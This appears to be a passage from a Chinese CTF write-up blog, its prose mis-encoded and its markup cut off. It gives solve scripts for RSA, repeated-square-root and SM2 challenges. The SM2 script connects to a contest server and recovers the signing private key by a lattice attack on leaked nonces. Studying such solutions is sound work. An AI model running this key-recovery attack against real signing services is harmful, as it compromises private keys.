    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹ä»¥å‰çš„ä¸€äº›æ¯”èµ›ï¼Œè¿™é‡Œæ„Ÿè°¢strivingå¤§ä½¬ï¼Œå¥½å¤šéƒ½æ˜¯é—®çš„ä»–å“ˆå“ˆå“ˆå“ˆã€‚</p><span id="more"></span><h1 id="æ­å¸ˆå¤§">æ­å¸ˆå¤§</h1><h2 id="ä¸€æ­¥åˆ°å–‚">ä¸€æ­¥åˆ°å–‚</h2><p>ä½©å°”æ–¹ç¨‹æ±‚è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_pell</span>(<span class="hljs-params">N</span>):<br>    cf = continued_fraction(sqrt(N))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        denom = cf.denominator(i)<br>        numer = cf.numerator(i)<br>        <span class="hljs-keyword">if</span> numer*numer - N * denom*denom == <span class="hljs-number">1</span> :<br>            <span class="hljs-keyword">return</span> numer, denom<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>d=<span class="hljs-number">105279230912868770223946474836383391725923</span><br>a=<span class="hljs-number">1293023064232431070902426583269468463</span><br>x,y=solve_pell(d//a)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(y)<br><span class="hljs-keyword">assert</span> <span class="hljs-number">1293023064232431070902426583269468463</span>*<span class="hljs-built_in">pow</span>(x,<span class="hljs-number">2</span>)==<span class="hljs-number">105279230912868770223946474836383391725923</span>*<span class="hljs-built_in">pow</span>(y,<span class="hljs-number">2</span>)+<span class="hljs-number">1293023064232431070902426583269468463</span><br>p=<span class="hljs-number">9850212100620338486478343799784951721581757936621772924971218807300819701941457605399099898870264241518769370682330612103782092302148525012450902351701339</span><br>q=<span class="hljs-number">10749429992014823019923966246896511618886613763258781706004694804949547801668777655988055847885755337127548775758133804022361510427909703124161450470578543</span><br>c=<span class="hljs-number">66847321508502017574023222490247591875197038421108556106531660421662626233521063441647157067220450229816184622038471812597874582613385516838920632450015292570673816423432903604941781889308906893966588610214614726388822851471695742453496232748358301888465563812947038856742838097152549971517159475947566599664</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=invert(x,phi)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(c,d,p*q))<br><span class="hljs-comment">#HZNUCTF&#123;D0_y0u_know_p3ll_3qu4tion!!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="checkin">checkin</h2><p>è¿ç»­24000æ¬¡å¼€æ–¹</p><p>quadratic_residueå’Œcipolla</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">square_root_of_quadratic_residue</span>(<span class="hljs-params">n, modulo</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Square root of quadratic residue</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Solve the square root of quadratic residue using Cipolla&#x27;s algorithm with Legendre symbol</span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        int -- if n is a quadratic residue,</span><br><span class="hljs-string">                   return x, such that x^&#123;2&#125; = n (mod modulo)</span><br><span class="hljs-string">               otherwise, return -1</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> modulo == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> n % modulo == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    Legendre = <span class="hljs-keyword">lambda</span> n: <span class="hljs-built_in">pow</span>(n, modulo - <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">1</span>, modulo)<br>    <span class="hljs-keyword">if</span> Legendre(n) == modulo - <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>    t = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> Legendre(t ** <span class="hljs-number">2</span> - n) != modulo - <span class="hljs-number">1</span>:<br>        t += <span class="hljs-number">1</span><br>    w = (t ** <span class="hljs-number">2</span> - n) % modulo<br>    <span class="hljs-keyword">return</span> (generate_quadratic_field(w, modulo)(t, <span class="hljs-number">1</span>) ** (modulo + <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">1</span>)).x<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_quadratic_field</span>(<span class="hljs-params">d, modulo=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Generate quadratic field number class</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        class -- quadratic field number class</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">assert</span> (<span class="hljs-built_in">isinstance</span>(modulo, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> modulo &gt;= <span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">QuadraticFieldNumber</span>:<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, x, y</span>):<br>            <span class="hljs-variable language_">self</span>.x = x % modulo<br>            <span class="hljs-variable language_">self</span>.y = y % modulo<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, another</span>):<br>            x = <span class="hljs-variable language_">self</span>.x * another.x + d * <span class="hljs-variable language_">self</span>.y * another.y<br>            y = <span class="hljs-variable language_">self</span>.x * another.y + <span class="hljs-variable language_">self</span>.y * another.x<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.__class__(x, y)<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__pow__</span>(<span class="hljs-params">self, exponent</span>):<br>            result = <span class="hljs-variable language_">self</span>.__class__(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">if</span> exponent:<br>                temporary = <span class="hljs-variable language_">self</span>.__class__(<span class="hljs-variable language_">self</span>.x, <span class="hljs-variable language_">self</span>.y)<br>                <span class="hljs-keyword">while</span> exponent:<br>                    <span class="hljs-keyword">if</span> exponent &amp; <span class="hljs-number">1</span>:<br>                        result *= temporary<br>                    temporary *= temporary<br>                    exponent &gt;&gt;= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> result<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;(&#123;&#125;, &#123;&#125; \\sqrt(&#123;&#125;))&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.x, <span class="hljs-variable language_">self</span>.y, d)<br><br>    <span class="hljs-keyword">return</span> QuadraticFieldNumber<br><br>n = <span class="hljs-number">22114546923564420607945063747927422619774890007937503484905798897563036431278699718161460968350749338680452479484253816646632515078192048118109272532310403715802657061990320170724360874028667484527150185159662403573637809180151665727445208585725264186578429094937215068881079399747998551453944363665401263</span><br>c = <span class="hljs-number">7274219309267176700435453490636404568410293850833252412471984274955007037941820465929958008672185817002749418809077052781794306899476543760452010370102811167685901654480233874375880047900499814304539829706786470978714629827690730256369200773772396109793338097451559255985268375731804819829315168807228186</span><br>h = <span class="hljs-number">1463929459818798711929811606552273520156490689917243949474579232718301828387871678397965433435537694532920957475947201372279363554005600100100224291888130</span><br>hint = <span class="hljs-number">5610276127312766429915480651516095336201056367031530733662980757514427535721885723009367286870294772595629284861923351543396909892645845139050780691701736</span><br><span class="hljs-comment"># b&#x27;HZNUCTF&#123;80f937af-6542-4142-b957-09534839da4d&#125;&#x27;</span><br><br>e = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">24_000</span><br>q = hint // <span class="hljs-number">2024</span> + <span class="hljs-number">2022</span><br>p = n // q<br>res1 = [c]<br>total = []<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> tqdm.tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">24_000</span>)):<br>    tmp, res1 = res1, []<br>    <span class="hljs-keyword">for</span> ct <span class="hljs-keyword">in</span> tmp:<br>        mm = square_root_of_quadratic_residue(ct, p)<br>        <span class="hljs-keyword">if</span> mm <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> total:<br>            total.append(mm)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> p - mm <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> total:<br>            total.append(p - mm)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> mm == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> mm == p - <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> mm == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        res1 += [mm, p - mm]<br>    res1 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(res1))<br>res1 = res1[-<span class="hljs-number">2</span>:]<br><br>res2 = c<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm.tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">24000</span>)):<br>    res2 = <span class="hljs-built_in">pow</span>(res2, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br>res2 = [res2, p - res2]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res2:<br>        m = crt([p, q], [i, j])[<span class="hljs-number">0</span>]<br>        m = long_to_bytes(<span class="hljs-built_in">int</span>(m))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;HZNUCTF&#x27;</span> <span class="hljs-keyword">in</span> m:<br>            <span class="hljs-built_in">print</span>(m)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># b&#x27;HZNUCTF&#123;80f937af-6542-4142-b957-09534839da4d&#125;\x97\x86w@b\x1e\xa36\xc7\xe4H5g5\x13\xca\x0f,&lt;\xa6\xb5\x16\x9ey\x92$\xd9\xd6\xa2~\x9f\xdagO\xbd\\3\x14\xfc\x05\xb8\x1f\r\xae2S\x1eA\x90\xaf&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="nothing">nothing</h2><p>sm2ç­¾å</p><p>hnpé—®é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm2<br>alp=ascii_letters+digits<br><span class="hljs-built_in">print</span>(alp)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">end,sha</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> alp:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> alp:<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> alp:<br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> alp:<br>                    start=a+b+c+d<br>                    s=(start+end).encode()<br>                    Sha=sha256(s).hexdigest()<br>                    <span class="hljs-keyword">if</span> Sha==sha:<br>                        <span class="hljs-keyword">return</span> start<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&#x27;43.156.230.30&#x27;</span>,<span class="hljs-number">10001</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>io.recvuntil(<span class="hljs-string">&#x27;sha256(XXXX+&#x27;</span>)<br>end=io.recvuntil(<span class="hljs-string">&#x27;) == &#x27;</span>)[:-<span class="hljs-number">5</span>].decode()<br><span class="hljs-built_in">print</span>(end)<br>sha=io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode()<br><span class="hljs-built_in">print</span>(sha)<br>xxxx=proof_of_work(end,sha)<br>io.recvuntil(<span class="hljs-string">&#x27;[+] Plz tell me XXXX: &#x27;</span>)<br>io.sendline(xxxx)<br>io.recvuntil(<span class="hljs-string">&#x27;ready?[y/n]\n[*] &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br>R=[]<br>S=[]<br>n=<span class="hljs-number">0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">55</span>):<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;[+] U can get my signature\n&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;[+] &#x27;</span>)<br>    rs=io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode().zfill(<span class="hljs-number">128</span>)<br>    r,s=<span class="hljs-built_in">int</span>(rs[:<span class="hljs-number">64</span>],<span class="hljs-number">16</span>),<span class="hljs-built_in">int</span>(rs[<span class="hljs-number">64</span>:],<span class="hljs-number">16</span>)<br>    R.append(r)<br>    S.append(s)  <span class="hljs-comment">#ri,si</span><br>    <span class="hljs-comment">#s(1+d)=k-r*d mod n</span><br>    <span class="hljs-comment">#s+(s+r)*d=k mod n</span><br>    <br>M=Matrix(<span class="hljs-number">55</span>+<span class="hljs-number">2</span>,<span class="hljs-number">55</span>+<span class="hljs-number">2</span>)<br>M=Matrix(QQ,M)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">55</span>):<br>    M[i,i]=n<br>    M[-<span class="hljs-number">2</span>,i]=S[i]+R[i]<br>    M[-<span class="hljs-number">1</span>,i]=S[i]<br>M[-<span class="hljs-number">2</span>,-<span class="hljs-number">2</span>]=<span class="hljs-number">2</span>**<span class="hljs-number">245</span>/n<br>M[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>**<span class="hljs-number">245</span><br>v=M.LLL()[<span class="hljs-number">1</span>]<br>sk=<span class="hljs-built_in">int</span>(v[-<span class="hljs-number">2</span>]*n/(<span class="hljs-number">2</span>**<span class="hljs-number">245</span>))<br>sk=n-sk  <span class="hljs-comment">#sk  #æ ¼å­</span><br><br>sm2_easy = sm2.CryptSM2(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)  <span class="hljs-comment">#sm2</span><br>pk = sm2_easy._kg(sk, sm2_easy.ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>]) <span class="hljs-comment">#</span><br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;I will give you the flag you want!(hexadecimal format)\n[*] &#x27;</span>)<br><span class="hljs-built_in">print</span>(pk)<br>io.sendline(<span class="hljs-built_in">hex</span>(sk))<br>io.recvall()<br></code></pre></td></tr></table></figure><h1 id="NKCTFæ‹›æ–°èµ›">NKCTFæ‹›æ–°èµ›</h1><h2 id="baby-RSA">baby_RSA</h2><p>è€ƒç‚¹ï¼š</p><ol><li>å·²çŸ¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo separator="true">,</mo><mi>d</mi><mi>p</mi><mo separator="true">,</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">e,dp,n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>åˆ†è§£<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></li><li>è´¹é©¬å°å®šç†ï¼Œæ•°è®ºæ¨å¯¼</li><li>coppersmithæ”»å‡»</li></ol><p>ç¬¬ä¸€æ­¥ï¼šå·²çŸ¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>p</mi></msub><mo>=</mo><mi>d</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d_p=d \mod {(p-1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>ï¼Œæ‰€ä»¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>âˆ—</mo><msub><mi>d</mi><mi>p</mi></msub><mo>=</mo><mi>e</mi><mo>âˆ—</mo><mi>d</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d_p=e*d \mod {(p-1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>ã€‚</p><p>æ ¹æ®RSAå‚æ•°ä¹‹é—´çš„å…³ç³»æœ‰ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>âˆ—</mo><mi>d</mi><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d=1\mod{(p-1)*(q-1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>ï¼Œé‚£ä¹ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>âˆ—</mo><mi>d</mi><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e*d=1\mod{p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span 